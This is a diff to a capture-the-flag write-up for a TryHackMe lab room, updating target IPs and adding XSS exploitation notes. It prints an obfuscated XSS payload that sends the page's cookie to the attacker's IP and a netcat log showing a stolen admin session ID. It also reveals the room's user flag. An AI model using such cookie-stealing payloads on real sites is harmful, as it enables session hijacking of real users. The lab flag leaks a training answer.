@@ -3,7 +3,7 @@
 **Difficulty:** Hard
 **Operating System:** Linux
 **Attacker IP:** 192.168.180.79
-**Machine IP:** 10.114.131.93
+**Machine IP:** 10.113.174.117
 **Domain:** review.thm
 **Room Link:** https://tryhackme.com/room/sequence
 
@@ -15,7 +15,7 @@ Initial machine scanning to identify open ports and running services.
 
 ```bash
 # Nmap Scan
-nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt 10.114.131.93
+nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt 10.113.174.117
 ```
 "",
 " **Full Nmap scan log:** [nmap_pelen_skan.txt](./nmap_pelen_skan.txt)",
@@ -32,7 +32,7 @@ Detailed analysis of open services. For the web server, I ran a hidden directory
 
 ```bash
 # Directory Brute-forcing
-gobuster dir -u 10.114.131.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400
+gobuster dir -u 10.113.174.117 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400
 ```
 **Full Gobuster results:** [gobuster_wyniki.txt](./gobuster_wyniki.txt)
 **Interesting Paths / Vulnerabilities Found:**
@@ -78,7 +78,7 @@ Internal Files discovered: /finance.php, /lottery.php.
 
 Potential Architecture: Internal network 192.x (possible Docker environment or SSRF vulnerability).
 
-http://10.114.131.93/phpmyadmin/ in version 4.5.9 - not vulnerable to common attacks.
+http://10.113.174.117/phpmyadmin/ in version 4.5.9 - not vulnerable to common attacks.
 
 ### XSS
 After moving around the website, and finally adding it to hosts as review.thm (havent seen that one)  
@@ -99,6 +99,26 @@ I have tried to use the same method like previously by chaning payload to go thr
 <img src=x o&#110;error="this.src='http://192.168.180.79/'+document['coo'+'kie']">
 ```
 So we know that XSS is still viable. Ill try to use XSS request forgery, and make a paylod which makes admin to change its own password, or grants me an admin role - but remember, that it needs CSRF token which we have to steal as well.
+But! Its not that easy! HArd to craft something which goes around suspiocious words list, and as well it seems it has a little bit more obfuscation. SO for me only above XSS payload halfly worked, that I had a connection to my listener. I got a little bit furious - You know how it is after several hours of trying and getting to nowhere. So I just send a link to feedback dashboard. ANd... it worked.  
+```bash
+❯ nc -lvnp 80
+listening on [any] 80 ...
+connect to [192.168.180.79] from (UNKNOWN) [10.113.174.117] 54096
+GET /?c=PHPSESSID=utu69j5dka8m2pn1i3o9caiv3i HTTP/1.1
+Host: 192.168.180.79
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://review.thm/
+Accept-Encoding: gzip, deflate
+```
+Im kinda sure it wasn't supposed to go this way, it had to do something with CSRF (didn't check if I could figure out a process of creating it), but it worked.
+**THM{Adm1NPawned007}**
+<details>
+  <summary>🚩 Click to see User Flag</summary>
+  
+  `THM{Adm1NPawned007}`
+</details>
 ### User Flag
 
 
